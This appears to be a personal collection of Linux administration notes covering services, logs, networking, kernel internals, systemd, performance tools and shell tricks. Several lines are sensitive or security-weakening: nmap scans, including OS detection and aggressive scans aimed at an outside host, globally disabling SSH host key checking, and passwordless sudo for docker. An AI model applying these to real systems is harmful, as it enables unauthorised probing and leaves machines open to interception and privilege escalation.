ldd : print shared library dependencies

=====
boot-up:

run scripts at startup : put in /etc/rc.local
others:
/etc/init.d/rcS
run scripts in /etc/rc2.d, which links to /etc/init.d

create init-style startup script:
update-rc.d <name> defaults

read /etc/rc2.d/README

default runlevel in /etc/init/rc-sysinit.conf

#start service at boot-up:
update-rc.d SERVICENAME defaults

#remove service from start at boot-up
update-rc.d -f service_name remove

===================================
#ways to manage upstart/init job

upstart jobs are in /etc/init
initctl list : list upstart job

#1:
#start/stop upstart job
start/stop/status docker #as root

#2:
#service
service --status-all
service docker stop/start/restart

#3:
/etc/init.d/docker start/stop/status

#4:
invoke-rc.d docker status

#list all startup processes
initctl list
systemctl list-unit-files --state=enabled
service --status-all

==================================

/etc/init/ttyN.conf : start a getty process for ttyN
stop tty6 : stop tty6

/etc/init/control-alt-delete.conf; define behavior for ctrl-alt-del

/var/log : lots of logs
/var/lib
/var/spool
/usr/share

/var/log/syslog
/var/log/auth.log #sudo log
/var/log/Xorg.0.log
/var/log/apport.log
/var/log/kern.log
/var/log/wtmp
/var/log/pm-powersave.log
/var/log/gpu-manager.log
/var/log/boot.log
/var/log/dmesg
/var/log/udev
/var/log/dpkg.log
/var/log/alternatives.log
/var/log/upstart/
/var/log/lightdm/

dig: DNS lookup utility
#reverse lookup
dig +short -x <ip addr>
====
another DNS utility: drill
drill www.google.com
drill www.google.com @8.8.8.8

#dns resolution:
systemd-resolve <hostname>

file copy tool: rsync

lsmod: list kernel module
modinfo: display module info
modules are in /lib/modules/
rmmod: remove modules
modprobe: add or remove modules
systool -v -m module_name #list options set for a loaded module
modprobe -c : show config
modprobe --show-depends module_name

--cron change
move popularity-contest from /etc/cron.daily to ~root/cron
move bsdmainutils from /etc/cron.daily to ~root/cron
move mlocate from /etc/cron.daily to /etc/cron.monthly
move locate from /etc/cron.daily to /etc/cron.monthly

--cron change 2015-01-16
change /etc/cron.daily/locate:
 add "/C /D /Data" to PRUNEPATHS
 add vboxsf to PRUNEFS

/etc/updatedb.conf:
   add /C to prunepaths
   add vboxsf to prunefs
DB: /var/lib/mlocate/mlocate.db

consider disabling mlocate cron job

anacron: for desktops and laptops that are not running 24/7
/var/spool/anacron
/etc/anacrontab

run-parts --report /etc/cron.daily

ufw - program for managing a netfilter firewall
ufw allow 22

sudo visudo #change /etc/sudoers file:
#allow user cheok to run docker without being prompted for the password
#sudo only ask for password per xterm session
added this line:
cheok ALL=(ALL) NOPASSWD: /usr/bin/docker

#swappiness
#the smaller the number, the less aggressive linux will swap
cat /proc/sys/vm/swappiness

/etc/sysctl.conf

iftop : display bandwidth usage on an interface by host
whois : client for the whois directory service

font cache commands:
fc-cache
fc-cat
fc-list
fc-match
fc-pattern
fc-query
fc-scan
fc-validate

fc : shell builtin that display and edits command
help fc : help is a shell builtin

#show distro info : LSB: linux standard base
--> lsb_release -a
output:
Distributor ID: Ubuntu
Description:    Ubuntu 14.10
Release:        14.10
Codename:       utopic

/etc/os-release

partprobe: inform the OS of partition table changes

commands:
lsattr
lsblk
lsb_release
lscpu
lsdiff
lshw
lsinitramfs
lslocks
lsmod
lsnrctl
lsof
lspci
lspcmcia
lspgpot
lsusb

initramfs: initial RAM-based filesystem: allow the kernel to execute programs before the root filesystem is mounted.
initrd: initial RAM disk: serves as a temporary root file system in RAM and allows the kernel to boot without
having to mount any physical disk.

GRUB config:
make a copy of /etc/default/grub and /boot/grub/grub.cfg
1. change /etc/default/grub
GRUB_DEFAULT=saved
GRUB_SAVEDEFAULT=true
GRUB_GFXMODE=640x480
#supported resolution?: 640×480, 800×600, 1024×768, 1280×1024, 1600×1200
GRUB_CMDLINE_LINUX : Entries on this line are added to the end of the 'linux' command line (GRUB
legacy's "kernel" line) for both normal and recovery modes. It is used to pass options to the
kernel.
2. run update-grub , this will change /boot/grub/grub.cfg
output of update-grub:
Found linux image: /boot/vmlinuz-3.16.0-30-generic
Found initrd image: /boot/initrd.img-3.16.0-30-generic
Found linux image: /boot/vmlinuz-3.16.0-23-generic
Found initrd image: /boot/initrd.img-3.16.0-23-generic
Found memtest86+ image: /boot/memtest86+.elf
Found memtest86+ image: /boot/memtest86+.bin
Found Windows 7 (loader) on /dev/sda2
===================================================
grub images: /usr/lib/grub/i386-pc

gfxmode:

If this variable is set, it sets the resolution used on the ‘gfxterm’ graphical terminal. Note that
you can only use modes which your graphics card supports via VESA BIOS Extensions (VBE), The default
is ‘auto’, which selects a platform-specific default that should look reasonable.
====
The resolution may be specified as a sequence of one or more modes, separated by commas (‘,’) or
semicolons (‘;’); each will be tried in turn until one is found. Each mode should be either ‘auto’,
‘widthxheight’, or ‘widthxheightxdepth’.

gfxpayload:

If this variable is set, it controls the video mode in which the Linux kernel starts up, replacing
the ‘vga=’ boot option. It may be set to ‘text’ to force the Linux kernel to boot in normal text
mode, ‘keep’ to preserve the graphics mode set using ‘gfxmode’, or any of the permitted values for
‘gfxmode’ to set a particular graphics mode (see gfxmode).

----------------------------------------------

uninstall a kernel image: apt-get remove linux-image-4.2.0-30-generic

/tmp cleanup, happen on reboot:
/etc/init/mounted-tmp.conf , which uses /etc/default/rcS , use TMPTIME var

#printf builtin (in bash):
$ printf "%d" "'a"
97
$ printf "%x" "'a"
61
'a -> convert a to its ascii code

need cifs-utils to access windows server, then do: sudo mount -t cifs -o username=heech //snt2/isdc ~/j

#add shared library path
option 1:
LD_LIBRARY_PATH is an environment variable you set to give the run-time shared library loader (ld.so) an extra set of directories to look for when searching for shared libraries
example: LD_LIBRARY_PATH=~/instantclient_11_2 python3
option 2:
 create a file under /etc/ld.so.conf.d/, then run ldconfig

##print shared libraries dependencies: ldd command

need instantclient-basic-linux.x64-11.2.0.3.0.zip instantclient-sdk-linux.x64-11.2.0.3.0.zip

add include and library path gcc:
C_INCLUDE_PATH=~/instantclient_11_2/sdk/include LIBRARY_PATH=~/instantclient_11_2 pip3 install --user cx_Oracle

special case (for npm oracledb only):
OCI_INC_DIR=~/instantclient_11_2/sdk/include LIBRARY_PATH=~/instantclient_11_2 npm install oracledb

#stop this message (when running evince): Couldn't connect to accessibility bus: Failed to connect to socket /tmp/dbus-sCAvokkUFt: Connection refused
export NO_AT_BRIDGE=1

rsync -avP userid@host:/path/to/file .
also: -z for compress
-P : preserve partially copied files, you can pick up where you left off
gotchas:
#1 Copy entire directory to remote parent directory:
rsync /path/without/slash host:/path/to/parent/with/slash/
------
#1a. dest does not exist
eg. rsync -av max tmp # same as rsync -av max tmp/
result: tmp is created and max is under tmp: tmp/max
diff -r max tmp/max #identical
#1b. dest exists
eg. rsync -av max tmp # same as rsync -av max tmp/
result: max is under tmp: tmp/max
diff -r max tmp/max #identical
---
#2 Copy contents of one directory to another:
rsync -r /path/to/directory/* host:/path/to/directory/
OR
# src will then match /media/heech/CHEOK/java/Playground/src
rsync -av src/* /media/heech/CHEOK/java/Playground/src
alternative: rsync -av src /media/heech/CHEOK/java/Playground
----
#2a. dest does not or does exist (dest dir is created if necessary)
eg rsync -av max/* tmp/ # same as rsync -av max/* tmp
diff -r max tmp #identical
----------
#3 Copy a directory into a new directory on another host:
rsync /path/without/slash host:/path/to/new/directory
#4 rsync file dirname #copy file to dirname/file
#5 rsync file dirname/filename #copy file to dirname/filename
#6 rsync file dirname/ #copy file to dirname/file, creating dirname if necessary

#cp
#1: dest is a directory -> make a copy with the same name in directory
#2: dest is not a directory -> make a copy with the specified path name.

#fast way to delete large number of files
mkdir empty && rsync -r --delete empty/ some-dir && rmdir empty

#sed: remove leading/trailing spaces from a file (in place)
sed -i -e 's/^[ \t]*//' -e 's/[ \t]*$//' <file>
sed -i 's/\x0d//' <file> #remove carriage return from a file (in place)

Replace text on commented lines
sed -n '/^\s*#/s/test/wow/p' blah.txt
Replace text, except on commented lines
sed -n '/^\s*#/!s/test/wow/p' blah.txt

#insert a file after a pattern
sed '/INCLUDE/ r foo.h' # insert foo.h after 'INCLUDE'

ls options:
--time-style=
full-iso
long-iso
iso
locale
+%H:%M:%S:%D

ls --format=across
# ls --format=comma
# ls --format=horizontal
# ls --format=long
# ls --format=single-column
# ls --format=verbose
# ls --format=vertical

ls --sort=extension
# ls --sort=size
# ls --sort=time
# ls --sort=version
# ls --sort=none

ip addr
route -n
/etc/network/interfaces
route add default gw 146.222.122.137

ls /sys/class/net/ to see network interfaces.

redirecting stdout and stderr:
&>word
>&word
the first one is preferred.
this is equivalent to >word 2>&1

#last reboot:
last reboot
#last shutdown entries:
last -x
last -x shutdown reboot

who -a or -b #show system boot info

ubuntu-drivers

#list file descriptors in kernel memory
sysctl fs.file-nr
#same as cat /proc/sys/fs/file-nr

#list max number of file descriptors
sysctl fs.file-max
#same as cat /proc/sys/fs/file-max

sysctl -a #show all values

#motd for ssh login
/var/run/motd.dynamic

because of the 3-way handshake, the kernel has two backlog queues for socket waiting for a connection:
listen syscall backlog parameter: the limit for the accept queue of incoming connections.
There are two queues: SYN queue and accept queue.
#1. when the server receives a SYN, the connection is in SYN-RECEIVED state, and it goes to the SYN queue.
#2. when the server receives a ACK, the connection is in ESTABLISHED state, and it goes to the accept queue.
#3. the application then has to call accept syscall to remove the connection from the accept queue.

net.core.somaxconn = 128
net.ipv4.tcp_max_syn_backlog = 512
somaxconn
1. Limit of socket listen() backlog,
2. limit for the accept queue
=================
tcp_max_syn_backlog
the limit for the SYN queue

#number of incoming connections backlog
net.core.netdev_max_backlog

netstat -ant | grep -c SYN_REC

tcp 3-way handshake
1. client send SYN to server (client in SYN-SENT state and server in SYN-RECEIVED state)
2. server send SYN-ACK to client
3. client send ACK to server (client and server in ESTABLISHED state)

calendar:
cal -y 2014
cal -3 #show prev, current, next months
cal -d 2014-07

envsubst: substitute environment variables
e.g:
echo "this is $HOME, wow" | envsubst
this is /home/heech, wow
"this is ${HOME}, wow" | envsubst
this is /home/heech, wow

#prevent ssh from asking you to add a host to known_hosts
#1: ssh-keyscan -H host >> ~/.ssh/known_hosts
#2: ssh -o StrictHostKeyChecking=no user@host  #ask for password
#3: change /etc/ssh/ssh_config:
Host *
   StrictHostKeyChecking no

nmcli dev
DEVICE  TYPE      STATE        CONNECTION
wlan0   wifi      connected    SCC_GUEST
eth1    ethernet  unavailable  --

nmcli dev show
GENERAL.DEVICE:                         wlan0
GENERAL.TYPE:                           wifi
GENERAL.HWADDR:                         00:26:C7:3A:5F:9C
GENERAL.MTU:                            1500
GENERAL.STATE:                          100 (connected)
GENERAL.CONNECTION:                     SCC_GUEST
GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/ActiveConnection/0
IP4.ADDRESS[1]:                         ip = 192.168.92.214/23, gw = 192.168.93.253
IP4.DNS[1]:                             209.244.0.3
IP4.DNS[2]:                             209.244.0.4
IP6.ADDRESS[1]:                         ip = fe80::226:c7ff:fe3a:5f9c/64, gw = ::

nmcli -f all dev show eth2
nmcli -f all dev show # show all devices
nmcli -p dev show eth2 #show DNS info
nmcli -f all g
nmcli c ->
NAME                UUID                                  TYPE             DEVICE
Wired connection 1  c614de98-714f-3f7a-8632-c47e53590cac  802-3-ethernet   eth2

/etc/NetworkManager/system-connections/Ipoh

#edit existing connection
nmcli c edit c614de98-714f-3f7a-8632-c47e53590cac
nmcli c show --active
nmcli c modify id 'MyCafe' 802-11-wireless.mtu 1350
===
nmtui
===
/var/lib/NetworkManager/dhclient-eth1.conf : contain hostname

find out my screen resolution:
#1: xdpyinfo | grep dimensions
#2: xrandr
show X db: xrdb -query

#change screen resolution
type xrandr to show available name for output and resolution:
++++++++++++++++++++
Screen 0: minimum 320 x 200, current 1920 x 1080, maximum 8192 x 8192
DIN disconnected (normal left inverted right x axis y axis)
DVI-0 connected 1920x1080+0+0 (normal left inverted right x axis y axis) 531mm x 299mm
   1920x1080      60.0*+
   1280x1024      75.0     60.0
   1152x864       75.0
   1024x768       75.1     60.0
   800x600        75.0     60.3
   640x480        75.0     60.0
   720x400        70.1
DVI-1 disconnected (normal left inverted right x axis y axis)
++++++++++++++++++++
change resolution:
xrandr --output DVI-0 --mode 1920x1080

#terminate the shell if no activity for 30 seconds
export TMOUT=30

#check if my machine is being pinged
tcpdump -ni eth2 icmp
#capture 2 packets and display packets n hex and ascii, write to a file, -tttt: print a timestamp
tcpdump -ni eth2 -c 2 -XX -w filename -tttt
# -n : do not resolve IP address, -X: display hex and ascii content, -S: show absolute sequence number
# -nn: do not resolve IP address or port number
# -XX: -X plus ethernet header
# -A : print in ascii only
tcpdump -nXS
# -D: show available interfaces
# -c : get x number of packets
# -s : show x bytes: -s 0 to show everything (default: 65535)
tcpdump -nn -XX -i eth2 -c 2 -s 0 -v icmp
tcpdump -nn -XX -i eth2 -c 2 -s 0 -v tcp
tcpdump -nn -XX -i eth2 -c 2 -s 0 -v udp
#
tcpdump -nn -XX -i eth2 -v host <ip>
tcpdump -nn -XX -i eth2 -v src <ip>
tcpdump -nn -XX -i eth2 -v dst <ip>
tcpdump -nn -XX -i eth2 -v net 1.2.3.0/24
tcpdump -nn -XX -i eth2 -v port 3389
tcpdump -nn -XX -i eth2 -v src port 3389
tcpdump -nn -XX -i eth2 -v dst port 3389
tcpdump src port 1025 and tcp
tcpdump portrange 21-23
#only see packets below or above a certain size (in bytes)
tcpdump less 32
tcpdump greater 128
===
tcpdump -nnvvS src 10.5.2.3 and dst port 3389
===
tcpdump 'src 10.0.2.4 and (dst port 3389 or 22)'
=== common use
tcpdump -nnXv -i eth2 host 146.222.121.69
tcpdump -nnAv -i eth2 host 146.222.121.69
=====
tcpdump -nnvvvA -i eth2 -w file.pcap host <ip>
=======
tcpdump broadcast/tcp/udp/icmp

#related to ulimit
/etc/security/limits.conf

useful shortcuts for top command:
1 : show individual cpu
z : highlight running processes
c : show absolute path of process

run with an empty environment: env -i

=== systemd ====
systemctl list-unit-files --type=service #equivalent to ls /etc/systemd/system/*.service and /lib/systemd/system/*.service
systemctl start/stop/enable/disable/restart/status virtualbox
#systemctl enable/disable: Enables/disable a service to be started on bootup:
systemctl mask foo  #Prevent a service from starting dynamically or even manually unless unmasked:
systemctl is-enabled foo
=============
Run level 3 is emulated by multi-user.target. Run level 5 is emulated by
graphical.target. runlevel3.target is a symbolic link to multi-user.target and runlevel5.target is a
symbolic link to graphical.target.
#You can switch to 'runlevel 5' by running
systemctl isolate graphical.target
systemctl set-default <name of target>.target
systemctl get-default
systemctl status
systemctl --failed
systemctl list-units
==============
/etc/systemd , /etc/systemd/system
/lib/systemd , /lib/systemd/system
==============
journalctl: query the contents of systemd journal
example:
journalctl _COMM=crond --since "10:00" --until "11:00"
journalctl --since yesterday
journalctl -PID=<pid>
journalctl -p err #err log level: all log levels: emerg,alert,crit,err,warning,notice,info,debug
journalctl --no-pager
journalctl -o json #json format
journalctl --disk-usage
journalctl --vacuum-size=1G
journalctl --vacuum-time=1years
journalctl -u lpd.service
journalctl -k #like dmesg
journalctl --utc
journalctl -b #most recent boot
journalctl -b -1 #with boot it
journalctl --list-boots
timedatectl
timedatectl status
====
/lib/systemd/system/multi-user.target.wants/
/lib/systemd/system/reboot.target.wants/
/etc/systemd/system/multi-user.target.wants/

coredumpctl from systemd-coredump
bootctl - Control the firmware and boot manager settings
systemd-cgtop

== execute shell script at startup boot using systemd ==
https://linuxconfig.org/how-to-automatically-execute-shell-script-at-startup-boot-on-systemd-linux
1. create a file disk-space-check.service in /etc/systemd/system/
=== file
[Unit]
After=mysql.service

[Service]
ExecStart=/usr/local/bin/disk-space-check.sh

[Install]
WantedBy=default.target
===
note: After: means run our script after mysql has been started
2.
systemctl daemon-reload
systemctl enable my_systemd_script.service

xxd: make a hex dump

manipulate or dump object files: objcopy and objdump
objdump : display info from object file
nm: list symbols from object file
disassemble a binary: objdump -d /bin/ls #att syntax is the default
objdump -Mintel -d /bin/ls #intel syntax
objdump -d -S <binary> #disassemble and display corresponding source code
alternative for disassemble:
gdb -q <binary>
-> info functions #show all functions
-> disassemble <function name>
-> disassemble /m <function name> #display source code as well (if available)

readlink: follow symbolic link
readlink -e `which google-chrome`
/opt/google/chrome/google-chrome

== virtual console
tty1 through 6 : there is a getty process
To access virtual console from X11: Ctrl-Alt-F1 thru F6
Once in virtual console, can use Alt-F1 throu 6 to switch. can also use alt-lefarrow and alt-rightarrow to cycle

X11 is running on tty7

do it from a command line: chvt 1
== virtual console

keyboard related programs:
loadkeys
showkey

download a full website:
wget --random-wait -r -p -e robots=off -U mozilla www.example.com

pmap: show memory map of a process
/proc/[pid]/statm:
  field #1: size, mapped to VIRT
  field #2: resident, mapped to RES
  field #3: share, mapped to SHR
  field #4: text, mapped to CODE
  field #5: lib , always 0
  field #6: data, mapped to DATA
  field #7: dt, always 0
/proc/[pid]/maps -> similar to output of pmap
/proc/[pid]/smaps
/proc/[pid]/status
/proc/[pid]/task/[threadid] #tgid is process id, pid is thread id
/proc/[pid]/comm : show program name
/proc/meminfo
smem program

#add new repo
#1: add key: apt-key add <key>
#2: add a file to /etc/apt/sources.list.d, call it something like docker.list

ps f : show process hierarchy
ps a : show processes owned by others
ps x : those without tty
ps u : user-friendly format
ps -L : show threads (LWP (lightweight process column))
ps -fHU <username> : show processes of username in hierarchical form
ps -L -o tid,pid,ppid,state,euid,egid,sid,pgid,tpgid,command <pid>
ps -o nlwp <pid> #show number of lightweight processes
ps auxww : wide output

#show top processes sorted by memory usage
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem
#show top processes sorted by cpu usage
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu
#list process in a hierarchy
ps -e -o pid,args --forest

7z a -mhe=on -ppassword important.7z important.txt for-honey.txt

check battery:
upower -i /org/freedesktop/UPower/devices/battery_BAT0 # deprecated supposedly
OR
cat /sys/class/power_supply/BAT0/uevent

#take every 10th line from the file
awk '!(NR % 10)' test.txt

#find working directory of a running process
#1. pwdx <pid1> <pid2>
#2. lsof -p <pid> | grep cwd
#3. readlink -e /proc/<pid>/cwd

pv program: show progress of task

pkg-config: manage compile and link flags for libraries (intended to work with automake and autoconf.)
provide the necessary details for compiling and linking a program to a library.

#convert doc to various format
$ pandoc -t plain README.md
-f : specify input format
-t : specify output format
-o : write to a file

#write a tab literal in Bash command line
$'\t'

#bash: create a string literal
$'..' : create a string with backslash-escaped characters.
example: $'\n\t'

$ ls -d .*
all files/directories that start with ., include . and ..
$ ls -d .[^.]*
all files/directories that start with ., exclude . and ..

---
autotools:
autogen.sh -> generate configure script
configure -> create a makefile

printer stuff:
system-config-printer
lpstat -d
======
#don't do remote admin
cupsctl --remote-admin # update /etc/cups/cupsd.conf
===========
localhost:631 #cups admin
===========
check printing error:
/var/log/cups/error_log
===
/etc/cups/ppd/ISD18.ppd
/etc/cups/printers.conf
====
AppSocket protocol: socket://host:9100
Internet printing protocol: port 631

UML: user mode linux
#1: create a .config file
1a. this is better
make ARCH=um defconfig
1b. may not work
make ARCH=um allnoconfig KCONFIG_ALLCONFIG=mini.config
#2: build it
make ARCH=um
#3: run it
./kernel ubda=Slamd64-12.1-root_fs mem=512m
#show config
./kernel --showconfig
====
linux kernel:
#takes current config (.config) and update it based on new kernel release
make oldconfig/silentoldconfig

verifying linux kernel signature:
$ xzcat linux-4.4.tar.xz | gpg --verify linux-4.4.tar.sign -
gpg: Signature made Sun 10 Jan 2016 03:09:18 PM PST using RSA key ID 00411886
gpg: Can't check signature: public key not found
$ gpg --keyserver hkp://keys.gnupg.net --recv-keys 00411886
gpg: requesting key 00411886 from hkp server keys.gnupg.net
gpg: keyserver timed out
gpg: keyserver receive failed: keyserver error

passing an environment to a process (one-off):
$ VAR=value ./test.sh
#note cannot do ./test.sh VAR=HI

#scan a port
nmap -p6000 localhost
#version scan
nmap -p7474 -sV localhost
#version scan and more, use this one
nmap -p7474 -A localhost
#check web server in use
nmap -p80 -sV www.google.com
#TCP SYN scan
nmap -p7474 -sS localhost
#
nmap -oA #output in 3 major formats
#OS detection
nmap -O <host>
#output scan in normal
nmap -oN <file>
#output scan in XML format
nmap -oX scandata.xml rigel
#discover all hosts in a network
nmap -sn 146.222.122.128/25
#get a list of hostname without pinging
nmap -sL 146.222.122.128/25
#typical usage: -T: speed template
nmap -T4 -A <ip>
--
nmap -sT -p- -Pn <hostname or IP>
====
nmap --top-ports 1000 -T4 -sC www.google.com

#make your script more robust
set -euo pipefail

#check dirty pages in page cache
$ cat /proc/meminfo | grep Dirty
Dirty:               204 kB
#flush system buffers
$ sync


As of 2.4 kernel, these two caches (page and buffer caches) have been combined. Today, there is only
one cache, the Page Cache
---
Buffers are in-memory block I/O buffers. They are relatively short-lived. Prior to Linux
kernel version 2.4, Linux had separate page and buffer caches. Since 2.4, the page and
buffer cache are unified and Buffers is raw disk blocks not represented in the page
cache—i.e., not file data. The Buffers metric is thus of minimal importance.


#I/O scheduler
cat /sys/block/sda/queue/scheduler
--> noop [deadline] cfq
CFQ : Completely Fair Queuing

#ulimit:
/etc/security/limits.conf

#run stress test
siege --log=siege.log -t5M -c 4 -i -b -f url.txt

tmux: from 2 horizontal panes to 2 vertical panes (and vice versa)
Prefix <SPC> : cycle through available layouts (bound to next-layout)
Prefix Alt-1 : even horizontal
Prefix Alt-2 : even vertical

ssh X11 forwarding
want to display on my-machine (where X server is running)
remote (where client will be run)

On my-machine: ssh -X user@remote
OR ssh -Y user@remote

#check for CRLF ending:
$ file /a/tapasjo/copy-paste.txt
/a/tapasjo/copy-paste.txt: ASCII text, with CRLF line terminators
---
$ grep -c  $'\r' /a/tapasjo/copy-paste.txt
27

braces:
trimming with variable substitution:
$ var=foo.pdf
$ echo ${var%.pdf} #trim suffix
foo
${var%pattern}: remove shortest part of pattern
${var%%pattern}: remove longest part of pattern
==========================
$ echo ${var#foo} #trim prefix
.pdf
${var#Pattern}: remove shortest part of pattern
${var##Pattern} : remove longest part of pattern
example:
_url=http://dns.measurement-factory.com/tools/dnstop/src/dnstop-20090128.tar.gz
echo "${_url#*/}"
=> /dns.measurement-factory.com/tools/dnstop/src/dnstop-20090128.tar.gz
echo "${_url##*/}"
=> dnstop-20090128.tar.gz

variable substitution: substring
${parameter:offset}
${parameter:offset:length}
${variable:position}
var=${string:position}

variable substitution: find and replace
${varName/Pattern/Replacement}
${varName/word1/word2}
====
#parameter substitution:
IP=1.2.3.4
echo ${IP/./ }
1 2.3.4
echo ${IP//./ }
1 2 3 4
#an extra / means global substitution
====
curly brace expansion
$ echo {00..8..2}
00 02 04 06 08
$ echo {00..8}
00 01 02 03 04 05 06 07 08
$ echo {D..T..4}
D H L P T

single bracket vs double bracket
single: POSIX
double: non-POSIX, only in bash, zsh, ksh
[ is a shell builtin and a program (/usr/bin/[
[[ is a keyword

profiling java program with perf:
#1. profiling: generate a file called perf.data
sudo perf record -F 99 -a -g sleep 30
OR
sudo perf record -F 99 -a -g -p PID sleep 30
#2. create method mappings : create a file called /tmp/perf-pid.map
    this file is used to translate memory address into function and variable names (used by perf report/script)
/home/heech/gitrepo/perf-map-agent/bin/create-java-perf-map.sh <pid>
#3. generate flame graph (need perf.data in current directory)
sudo perf script | ~/gitrepo/FlameGraph/stackcollapse-perf.pl | ~/gitrepo/FlameGraph/flamegraph.pl --color=java --hash > flamegraph.svg
# text report
sudo perf report --stdio
#ncurses window
sudo perf report
#list raw event
sudo script
===
#cpu counter stats
perf stat -a sleep 10
perf stat -ad sleep 3 #more details

Ctrl-x, Ctrl-e : will bring up an $EDITOR containing whatever is currently entered into the prompt.
  "\C-x\C-e": edit-and-execute-command
Ctrl-Alt-e to expand any placeholders/variables in the current line.
  "\e\C-e": shell-expand-line

echo ~- # echo previous directory

#capture output of command into clipboard
"do stuff" | xsel -ib

kernel version numbering
example: 4.2.0-34
4: kernel version
2: major revision of the kernel version
0: minor revision of the kernel. It is only changed when new features or new drivers are added.
34: The fourth number represents corrections, such as security patches and bug (i.e., error) fixes

#show kernel drivers handling each device and also kernel modules capable of handling it.
lspci -kv
#check graphic driver
lspci -nnk |grep -iA2 vga

if the system hangs:
Hold down the ‘alt’ and ‘sysrq’ keys on your keyboard and whilst they are held down type the following slowly:
REISUB

#get SATA/IDE device info
hdparm /dev/sda
#show blocks occupied by a file
sudo hdparm --fibmap <filename>
example output:
file.txt:
 filesystem blocksize 4096, begins at LBA 1404430336; assuming 512 byte sectors.
 byte_offset  begin_LBA    end_LBA    sectors
           0 1869805696 1869805703          8


badblocks : search a device for bad blocks
readelf: display info about ELF files

procfs: originally intended to expose process info, then became a big mess
sysfs: expose kernel info

kernel diff and patch:
#1 generate patch
diff -Naur -X linux-2.6.19/Documentation/dontdiff linux-2.6.19/ linux-2.6.19-dirty/ > my_patch
#2 apply patch
cd linux-2.6.19; patch -p1 < ../patch-2.6.20
# -p1 tells the patch command to skip 1 leading slashes from the filenames present in the patch file.

===========================
creating and applying patches:
diff -u hello.c hello_new.c > hello.patch
patch < hello.patch
patch -b < hello.patch #take a backup before applying patches
patch --dry-run < hello.patch #dry run
patch -R < hello.patch #reverse a patch

kernel entry point:
arch/x86/boot/header.S -> calll main

loop device is a pseudo ("fake") device (actually just a file) that acts as a block-based device. a file that contains a filesystem
loop device is a pseudo device that makes a file look like a block device. (command: losetup /dev/loop0 <filename>)

========= loop device =========
dd if=/dev/zero of=file.img bs=1k count=10000
losetup /dev/loop0 file.img
mkfs.ext4 -c /dev/loop0 10000
mount -t ext4 /dev/loop0 /mnt/point1
========= loop device =========

#system-wide limit on open file descriptors
cat /proc/sys/fs/file-max
#change limit:
/etc/security/limits.conf
/etc/sysctl.conf

from setrlimit (ulimit is a wrapper around setrlimit):
===
The soft limit is the value that the kernel enforces for the corresponding resource.  The hard limit
acts as a ceiling for the soft limit: an unprivileged process may set only its soft limit to a value
in the range from 0 up to the hard limit, and (irreversibly) lower its hard limit.  A privileged
process (under Linux: one with the CAP_SYS_RESOURCE capability) may make arbitrary changes to either
limit value.
---
hard limit: the maximum allowed to a user, set by the superuser/root. This value is set in the file
/etc/security/limits.conf. Think of it as an upper bound or ceiling or roof.
soft limit: is the effective value right now for that user. The user can increase the soft limit on
their own in times of needing more resources, but cannot set the soft limit higher than the hard
limit.

#time zone: display time
$ TZ="America/New_York" date
Tue Apr 19 10:51:17 EDT 2016
#time zone files: /usr/share/zoneinfo/

cat /etc/os-release

linux kernel startup:
#kernel entry point:
arch/x86/boot/header.S
#next
arch/x86/boot/main.c
#next
arch/x86/boot/pm.c
#next
arch/x86/boot/pmjump.S
#next entry point:
arch/x86/kernel/head_64.S
#next
arch/x86/kernel/head64.c -> x86_64_start_kernel() ->
#next
init/main.c -> start_kernel() -> rest_init() -> kernel_init()
                                             -> kernel/sched/idle.c: cpu_startup_entry() -> cpu_idle_loop()
kernel init:

#dump info file system and look at superblock
dumpe2fs /dev/sda6 | grep -i superblock

superblock is essentially file system metadata and defines the file system type, size, status, and
information about other metadata structures (metadata of metadata).
metadata about filesystem.
====
An inode exists in, or on, a file system and represents metadata about a file.
====
dentry (directory entry)
what the Linux kernel uses to keep track of the hierarchy of files in directories. Each dentry maps
an inode number to a file name and a parent directory.

#documentation in linux source: Documentation/sysctl/vm.txt
To free pagecache:
echo 1 > /proc/sys/vm/drop_caches
To free dentries and inodes:
echo 2 > /proc/sys/vm/drop_caches
To free pagecache, dentries and inodes:
echo 3 > /proc/sys/vm/drop_caches

#manipulate the real-time attributes of a process : chrt
#set or retrieve a process's CPU affinity : taskset

hardware interrupts:
/proc/interrupts:
first column: interrupt #
second column: how many times the CPU core has been interrupted
#from /proc/interrupts : i8042 is the keyboard controller
i8042 controller controls PS/2 keyboards and mice in PCs
smaller IRQ number means higher priority
=====
software interrupts: /proc/softirqs

/proc/stat : show interrupt count

/sys/devices/system/cpu

system performance tools:
mpstat
sar
iostat
pidstat
sadf
cifsiostat

interrupt CPU affinity value:
/proc/irq/<irq#>/smp_affinity  #this is a mask
/proc/irq/<irq#>/smp_affinity_list #this is the cpu number

showkey #show linux key code
xev #show X11 key code

block device: data move in blocks. support buffering and random access. accessed randomly
sector: smallest addressable unit on a block device. a physical property of the device,
  the smallest unit of transfer for the device.
block: smallest addressable unit in a filesystem, smallest unit of transfer for a block device driver.
block size must be a power of two and cannot be larger than a page frame. must be a multiple
of the sector size.
each block requires its own buffer, which is a region of RAM used by the kernel to store
the block's content.
============
character device: data is streamed character by character. accessed as a stream of data.

linux has two disk caches: buffer cache and page cache
buffer cache and page cache have been combined.

/proc/filesystems

software interrupt (SoftIRQ)
processes: ksoftirqd/0 , etc
software interrupts are kernel routines that are scheduled to run at a time when other
tasks will not be interrupted.

When a NIC receives incoming data, it copies the data into kernel buffers using DMA.
The NIC notifies the kernel by means of a hardware interrupt. These interrupts do minimal
work as they have already interruptted another task and cannot be interruptted themselves.
Software interrupts then drain the network adapter receive ring buffers.
protocol handlers then process the data. finally, data is delivered to a socket
buffer where an application can call the receive function.

networking info:
/proc/net/dev
/proc/net/tcp
/proc/net/unix
/proc/net/snmp

networking tools:
dropwatch
ip
ethtool

load: # of processes using or waiting for the CPU.
load average: the load averaged over 1,5,15 minutes
/proc/loadavg

parted /dev/sda print

net: Tool for administration of Samba and remote CIFS servers.
mtr: a network diagnostic tool
iptables: firewall
mrtg - multi router traffic grapher

load balancing tool: pen, pound, balance

snort - flexible Network Intrusion Detection System

============
monitor SMART disk: smartctl and smartd
smartctl -i /dev/sda #info
smartctl -a /dev/sda #all info
smartctl -x /dev/sda #even more info
smartctl -H /dev/sda #health info
smartctl -l selftest /dev/sda

#available test: offline, short, long, conveyance
smartctl -a:
Pre-fail: if the VALUE column is below the THRESH column, be concerned

#run test
smartctl -t short /dev/sda
smartctl -t long /dev/sda

#abort test
smartctl -X

#show capability:
smartctl -c /dev/sda
===================

rootkit: a software package that enables an unauthorized user to obtain
root privileges

#find processes using files/sockets
fuser -v -m <filesystem> #filesystem can be specified as directory name or /dev/sda1
OR:
